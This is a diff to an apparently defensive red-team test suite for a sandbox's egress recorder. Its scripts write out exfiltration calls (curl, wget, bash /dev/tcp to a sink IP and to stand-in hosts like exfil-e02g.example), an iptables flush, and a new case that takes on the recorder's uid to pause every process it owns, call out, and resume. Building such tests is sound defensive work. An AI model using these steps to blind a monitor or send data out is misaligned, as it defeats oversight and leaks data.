@@ -31,6 +31,15 @@ def chk(type, name, kind=DET, severity="must", vm_only=False, **kw):
 
 VOUT = chk("verdict", "verdict is out_of_scope", value="out_of_scope")
 
+
+def ip_attempt(port):
+    """A call straight to an IP address never completes its handshake under the sandbox, so there is no
+    request path: it shows as a blocked connection to the port (kernel log of the nat connect rule) or at
+    least in the connect counter (out_of_scope network)."""
+    return chk("any_of", "attempt recorded (recorder, kernel log or connect counter)", of=[
+        chk("egress_seen", "connection to the sink port listed", port=port),
+        chk("scope_reason", "connection counted as denied", scope_kind="network")])
+
 ATTACKS = []  # list of (id, class, title, script_body, checks, extra_expect_fields)
 
 
@@ -105,11 +114,11 @@ def net(id, title, body, checks, **extra):
 
 net("network-01-curl-direct-ip", "curl POST straight to the sink's IP", """
 curl -sS -m 5 -X POST --data 'rt-l4 test payload' "http://$SINK_IP:8080/up" || true
-""", [chk("egress_seen", "attempt recorded", path="/up"), VOUT])
+""", [ip_attempt(8080), VOUT])
 
 net("network-02-wget", "wget POST to the sink", """
 wget -q -T 5 -O /dev/null --post-data='rt-l4 test' "http://$SINK_IP:8080/wg" || true
-""", [chk("egress_seen", "attempt recorded", path="/wg"), VOUT])
+""", [ip_attempt(8080), VOUT])
 
 net("network-03-bash-devtcp", "Raw TCP via bash /dev/tcp (no nc installed)", """
 exec 3<>"/dev/tcp/$SINK_IP/4444" && printf 'rt-l4 raw tcp\\n' >&3
@@ -165,7 +174,7 @@ curl -s -m 4 -X POST "http://evil.test/price-changed" -H 'Host: hooks.partner.ex
 
 net("network-12-relative-port", "HTTP to the sink on a non-standard, unexpected port", """
 curl -sS -m 4 "http://$SINK_IP:12345/odd" -d 'rt-l4' || true
-""", [chk("egress_seen", "attempt recorded", path="/odd"), VOUT])
+""", [ip_attempt(12345), VOUT])
 
 # ------------------------------------------------------------------ keys and decoys
 def keys(id, title, body, checks, **extra):
@@ -235,12 +244,7 @@ def recorder_gap(path=None, port=None):
     not paused) and the call was recorded. A call by name is recorded by the recorder (path); a call
     straight to an IP address never completes its handshake, so it shows as a blocked connection to
     the port (kernel log) or at least in the connect counter (out_of_scope network)."""
-    if path:
-        seen = chk("egress_seen", "attempt recorded", path=path)
-    else:
-        seen = chk("any_of", "attempt recorded (recorder, kernel log or connect counter)", of=[
-            chk("egress_seen", "connection to the sink port listed", port=port),
-            chk("scope_reason", "connection counted as denied", scope_kind="network")])
+    seen = chk("egress_seen", "attempt recorded", path=path) if path else ip_attempt(port)
     return [chk("any_of", "tampering is visible: integrity red, or the recorder kept running and the "
                           "attempt was recorded", B, of=[
         chk("integrity_red", "integrity red"),
@@ -292,6 +296,25 @@ curl -s -m 3 -d 'x' http://exfil-e02f.example/e02f || true
 [ -n "$pid" ] && kill -CONT "$pid" && echo resumed
 sleep 3
 """, recorder_gap(path="/e02f"))
+
+# No PID needed: as the recorder's own uid, kill(-1) reaches every process of that uid. Signal
+# permission compares uids only, so this needs nothing but setuid() (no su: NoNewPrivileges).
+esc("escape-02g-setuid-signal-all", "Become the recorder's user, pause everything it owns, call a name, resume",
+    """
+as_recorder() {
+  python3 -I -c 'import os, pwd, signal, sys
+u = pwd.getpwnam("rt-egress")
+os.setgroups([])
+os.setgid(u.pw_gid)
+os.setuid(u.pw_uid)
+os.kill(-1, getattr(signal, sys.argv[1]))
+print("sent", sys.argv[1], "as uid", os.getuid())' "$1" 2>&1 || echo "switch to rt-egress refused"
+}
+as_recorder SIGSTOP
+curl -s -m 3 -d 'x' http://exfil-e02g.example/e02g || true
+as_recorder SIGCONT
+sleep 3
+""", recorder_gap(path="/e02g"))
 
 esc("escape-03-iptables-flush", "iptables -F (filter, nat, v6), then call out", """
 iptables -F; iptables -t nat -F; ip6tables -F
